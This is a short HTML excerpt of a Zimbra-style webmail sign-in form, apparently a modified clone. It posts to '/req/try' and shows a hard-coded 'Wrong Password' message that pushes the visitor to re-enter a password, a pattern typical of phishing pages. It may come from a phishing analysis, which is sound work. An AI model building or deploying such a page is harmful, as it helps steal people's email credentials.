...
<body onload="onLoad();">
	...
	<div id="modifiedLogin" class="LoginScreen">
		<div class="modernCenter">
				...
				<form id="zLoginForm" method="post" name="loginForm" action="/req/try" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="bd7ddbf6-4d19-4c39-a10c-a762bac02c3d">

								<div class="signIn">Sign In</div>
                        <div class="form">
                        <div id="errorMessageDiv" class="errorMessage" style="">
				Wrong Password. Login again to continue.
                            </div>
                        <div class="loginSection">
                                    ...
                                    <div class="passwordWrapper">
                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" required="" type="password" value="" size="40" maxlength="1024">
